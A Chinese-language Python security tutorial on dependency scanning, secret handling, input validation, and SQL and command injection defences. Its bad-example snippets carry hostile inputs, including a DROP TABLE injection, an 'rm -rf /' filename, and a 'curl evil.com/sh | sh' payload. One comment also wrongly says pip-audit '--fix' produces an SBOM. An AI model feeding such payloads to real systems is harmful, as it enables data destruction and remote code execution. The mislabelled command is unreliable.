# 安全基础：依赖、密钥与注入防线

> 安全不是上线前的装饰，而是从第一行代码就掺进去的习惯。这一课讲三件最基础也最常被忽略的事：依赖漏洞怎么查、密钥怎么管、两类致命注入（SQL 和命令注入）怎么防。

## 依赖漏洞：你的项目比你以为的更"开放"

你写的代码可能没漏洞，但你引入的第三方库有。2021 年的 `log4shell`、2024 年的各类供应链事件都说明一件事：**依赖链是你项目的攻击面**。好消息是，查依赖漏洞成本极低，几乎不花钱。

`pip-audit` 是官方推荐的依赖漏洞扫描工具，基于 Python 软件打包管理局的漏洞数据库：

```bash
# 安装
$ pip install pip-audit

# 扫描当前环境里所有已装的包
$ pip-audit

# 只扫项目声明的依赖
$ pip-audit -r requirements.txt

# 生成 SBOM（软件物料清单），便于归档和复扫
$ pip-audit --fix --requirement requirements.txt
```

输出示例：

```text
Found 1 known vulnerability in 1 package

Package  Version  ID              Fix Versions
-------- --------  -------------- ------------
requests 2.20.0   PYSEC-2023-xxx 2.31.0
```

**翻车现场：从来不扫，直到被安全团队通报**

```text
# WRONG：依赖文件三年没动过
$ cat requirements.txt
requests==2.20.0
flask==1.0.2
# 这两行背后牵着几十条传递依赖，其中多个已有 CVE
```

```text
安全团队通报：
requests 2.20.0 存在 CVE-2023-32681（敏感信息泄露）
# 而 pip-audit 一行命令就能提前发现
```

**正确做法**：把 `pip-audit` 接进 CI，让它成为和"跑测试"一样的强制关卡。漏洞不过关就不让合并/发布。

```yaml
# .github/workflows/security.yml 节选
- name: Run pip-audit
  run: |
    pip install pip-audit
    pip-audit -r requirements.txt
```

## 密钥管理：环境变量是最低配，KMS 是正解

**硬编码密钥是最大的安全错误，没有之一。** 一旦密钥进代码、进版本库，它就会被复制到 clone、fork、CI 缓存、历史记录里，删除几乎不可能彻底。

最低可接受的做法是**环境变量**：

```python
import os

# WRONG：写死在源码
API_KEY = "sk-abcdef123456"

# RIGHT：从环境变量读取，缺省时给清晰的错误
API_KEY = os.environ.get("API_KEY")
if not API_KEY:
    raise RuntimeError("缺少环境变量 API_KEY，请先配置后再启动")
```

配合 `.env` 文件（**必须写进 `.gitignore`**）：

```bash
# .env（不上版本库）
API_KEY=sk-abcdef123456
DATABASE_URL=postgresql://user:pass@localhost/app
```

读 `.env` 用 `python-dotenv`：

```python
from dotenv import load_dotenv
load_dotenv()   # 自动加载 .env 到环境变量
```

**更正规的做法是密钥管理服务（KMS / Secret Manager）**，例如云厂商提供的服务。应用启动时去取，密钥不落盘、不进代码、可轮换、可审计：

```python
# 伪代码，具体 API 取决于所用云平台
def get_secret(name):
    client = SecretManagerClient()
    return client.get_secret(name)   # 从云端取，密钥不落本地
```

| 方案 | 优点 | 缺点 |
|---|---|---|
| 环境变量 | 简单、零成本、所有平台通用 | 容易被 `printenv`、日志、子进程继承泄露 |
| `.env` 文件 | 本地开发方便 | 必须 gitignore，仍有落盘风险 |
| KMS / Secret Manager | 不落盘、可轮换、有审计 | 需要云平台、有网络依赖 |
| 硬编码 | 没有任何优点 | 一定会泄露，绝对禁止 |

**翻车现场：`.env` 忘了 gitignore**

```bash
$ cat .gitignore
__pycache__/
*.pyc
# 忘了加 .env
$ git add . && git commit -m "init"
$ git push
```

```text
几小时后：
告警：你的 API_KEY 出现在 GitHub 公开仓库
# 即使立刻删除，Git 历史里仍有，搜索引擎可能已收录
```

**正确做法**：提交前检查 `.gitignore`；发现泄露立即**轮换密钥**（老密钥作废），仅删除文件或回滚提交都不够。

## 输入校验：所有外部输入都是恶意的

**永远不要信任外部输入**——用户表单、API 参数、文件路径、消息队列里的内容。校验要放在最外层，越早越好。

```python
from dataclasses import dataclass
from typing import Optional

@dataclass
class UserInput:
    username: str
    age: int

def parse_input(raw: dict) -> Optional[UserInput]:
    # 校验类型、范围、格式
    name = raw.get("username", "")
    if not isinstance(name, str) or not name.strip():
        return None
    if len(name) > 50:
        return None
    age = raw.get("age", 0)
    if not isinstance(age, int) or age < 0 or age > 150:
        return None
    return UserInput(username=name.strip(), age=age)
```

**翻车现场：直接相信用户输入的类型和范围**

```python
# WRONG：以为前端会校验
def create_user(data):
    return User(name=data["name"], age=data["age"])
```

```text
攻击者发送：{"name": "a" * 10000000, "age": "not a number"}
# 服务内存暴涨 / 类型转换异常 → 拒绝服务
```

**教训**：前端校验是体验，后端校验才是安全。所有边界都要校验。

## SQL 注入防线：用参数化查询

SQL 注入是几十年老问题，至今仍是 OWASP Top 10。原理很简单：**把用户输入直接拼进 SQL 字符串，等于把数据库的操控权交给用户**。

```python
# WRONG：字符串拼接，致命
def get_user(conn, username):
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE name = '" + username + "'")
    # 如果 username = "'; DROP TABLE users; --"
    # 拼出来的 SQL 会执行两条语句，删掉整张表
```

```python
# RIGHT：用参数化查询，让数据库把输入当数据而不是代码
def get_user(conn, username):
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE name = %s", (username,))
    return cursor.fetchone()
```

```python
# 也支持命名参数
cursor.execute(
    "SELECT * FROM users WHERE name = %(name)s AND age > %(age)s",
    {"name": username, "age": 18},
)
```

**为什么有效**：参数化查询会先把 SQL 结构发给数据库编译，再把参数作为纯数据传入。无论参数里有什么字符，都不会被当成 SQL 代码执行。

**翻车现场：用了 ORM 却还是拼接**

```python
# WRONG：ORM 的 raw / text 里照样能注入
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
```

```text
ORM 只是默认帮你参数化，一旦你手写 SQL 字符串，防线就没了
```

**正确做法**：任何手写 SQL 都用占位符；ORM 的 raw/text 也要用参数绑定。

## 命令注入防线：绝不拼接 shell 命令

和 SQL 注入同理，把用户输入拼进 `os.system` 或 `subprocess` 的 shell 字符串，等于给用户一个远程 shell。

```python
import subprocess

# WRONG：直接拼字符串，灾难
def convert(filename):
    os.system("convert " + filename + " out.png")
    # filename = "a.png; rm -rf /"  → 任意命令执行
```

```python
# RIGHT：用列表形式传参，且 shell=False（默认）
def convert(filename):
    subprocess.run(["convert", filename, "out.png"], check=True)

# 如果必须用到 shell 特性（如通配符），也要对变量严格白名单校验
ALLOWED = re.compile(r"^[A-Za-z0-9_.-]+$")
def safe_convert(filename):
    if not ALLOWED.match(filename):
        raise ValueError("非法文件名")
    subprocess.run(f"convert {filename} out.png", shell=True, check=True)
```

| 做法 | 安全？ |
|---|---|
| `os.system("cmd " + user_input)` | 绝对不安全 |
| `subprocess.run("cmd " + user_input, shell=True)` | 不安全 |
| `subprocess.run(["cmd", arg1, arg2])` | 安全，参数不会被解释为命令 |
| `subprocess.run(f"...{x}...", shell=True)` 且 x 经过严格白名单 | 有条件安全，能不用就不用 |

**翻车现场：用 `shell=True` 又拼接了用户输入**

```python
# WRONG：这两个危险要素叠加
subprocess.run(f"grep {user_pattern} data.txt", shell=True)
# user_pattern = "foo; curl evil.com/sh | sh"
```

```text
结果：远程代码执行，服务器被控
grep: foo: 没找到
# 而 curl 那段已经在后台跑起来了
```

**教训**：`shell=True` + 外部输入 = 高危组合，应该尽量避免。必须用时，对变量做白名单，并且只传允许的值。

## 小结

- 依赖漏洞扫描是零成本的安全投入，`pip-audit` 接进 CI
- 密钥绝不硬编码；最低用环境变量，正式环境用 KMS
- `.env` 必须 gitignore，泄露后必须轮换密钥
- 所有外部输入都要校验：类型、范围、格式
- SQL 注入用参数化查询（`%s` / `?`），绝不字符串拼接
- 命令注入用 `subprocess` 列表形式、避免 `shell=True`；必须用时做白名单
